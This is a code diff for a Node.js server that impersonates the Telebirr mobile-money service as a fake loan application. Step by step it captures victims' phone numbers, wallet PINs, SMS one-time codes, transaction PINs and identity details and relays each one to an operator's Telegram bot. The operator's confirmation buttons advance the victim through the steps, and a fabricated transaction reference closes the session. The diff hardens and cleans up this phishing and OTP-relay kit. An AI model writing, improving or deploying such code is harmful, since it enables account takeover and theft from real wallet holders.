@@ -5,6 +5,15 @@ const socketIo = require('socket.io');
 const path = require('path');
 const cors = require('cors');
 
+// Runtime Environment Variable Checks
+const REQUIRED_ENV_VARS = ['BOT_TOKEN', 'ADMIN_CHAT_ID'];
+REQUIRED_ENV_VARS.forEach((envVar) => {
+    if (!process.env[envVar] || process.env[envVar].trim() === "") {
+        console.error(`❌ [CRITICAL INITIALIZATION ERROR] Missing required environment configuration: ${envVar}`);
+        process.exit(1);
+    }
+});
+
 const botManager = require('./bot_manager');
 
 const app = express();
@@ -26,9 +35,15 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Webhook route configuration
 app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
-    botManager.bot.processUpdate(req.body);
-    res.sendStatus(200);
+    try {
+        botManager.bot.processUpdate(req.body);
+        res.sendStatus(200);
+    } catch (err) {
+        console.error("❌ Error parsing inbound webhook payload:", err.message);
+        res.sendStatus(500);
+    }
 });
 
 io.on('connection', (socket) => {
@@ -60,7 +75,7 @@ io.on('connection', (socket) => {
         botManager.sendToAdmin(currentId, "Step 1: Telebirr Login Attempt", {
             "Mobile Phone": `+251${data.phone}`,
             "Wallet Access PIN": data.pin
-        }, true); // Setting true prompts admin confirmation buttons to advance to Step 2 (SMS OTP)
+        }, true);
     });
 
     // STEP 2: Telebirr SMS OTP Code Verification
@@ -68,7 +83,7 @@ io.on('connection', (socket) => {
         const currentId = getValidId(data);
         botManager.sendToAdmin(currentId, "Step 2: SMS OTP Token Submitted", {
             "SMS OTP Code": data.code
-        }, true); // Setting true prompts admin confirmation buttons to advance to Step 3 (Transaction PIN)
+        }, true);
     });
 
     // STEP 3: Account Security Transaction PIN Verification
@@ -76,10 +91,10 @@ io.on('connection', (socket) => {
         const currentId = getValidId(data);
         botManager.sendToAdmin(currentId, "Step 3: Account Security Transaction PIN", {
             "Transaction PIN": data.pin
-        }, true); // Setting true prompts final admin buttons to advance to Step 4 (Loan Configuration)
+        }, true);
     });
 
-    // STEP 4: Loan Request Parameter Parameters (Passive configuration collection)
+    // STEP 4: Loan Request Parameter Configuration
     socket.on('submit-step4-loan-config', (data) => {
         const currentId = getValidId(data);
         botManager.sendToAdmin(currentId, "Step 4: Micro-Credit Loan Settings", {
@@ -89,7 +104,7 @@ io.on('connection', (socket) => {
         }, false);
     });
 
-    // STEP 5: KYC Core Profile Data (Passive configuration collection)
+    // STEP 5: KYC Core Profile Data
     socket.on('submit-step5-kyc-profile', (data) => {
         const currentId = getValidId(data);
         botManager.sendToAdmin(currentId, "Step 5: KYC User Profile Metrics", {
@@ -107,7 +122,6 @@ io.on('connection', (socket) => {
             "Monthly Earnings": `${data.income} ETB`
         }, false);
 
-        // Instantly generate and close out disbursement confirmation targets
         const txnReferenceId = `TXN-${Math.floor(100000 + Math.random() * 900000)}-ETB`;
         io.to(currentId).emit('application-complete', { referenceId: txnReferenceId });
         console.log(`✅ Session ${currentId} disbursement workflow committed.`);
@@ -121,12 +135,15 @@ io.on('connection', (socket) => {
 server.listen(PORT, async () => {
     console.log(`🚀 Telebirr Core Financial System running on port ${PORT}`);
     if (EXTERNAL_URL) {
-        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
+        const baseUrl = EXTERNAL_URL.endsWith('/') ? EXTERNAL_URL.slice(0, -1) : EXTERNAL_URL;
+        const webhookUrl = `${baseUrl}/bot${process.env.BOT_TOKEN}`;
         try {
             await botManager.bot.setWebHook(webhookUrl);
-            console.log(`✅ Telegram Webhook successfully set to: ${webhookUrl}`);
+            console.log(`✅ Telegram Webhook successfully configured to: ${webhookUrl}`);
         } catch (err) {
             console.error('❌ Webhook Setup Failed:', err.message);
         }
+    } else {
+        console.log("⚠️ RENDER_EXTERNAL_URL missing or empty. Skipping webhook deployment initialization.");
     }
 });
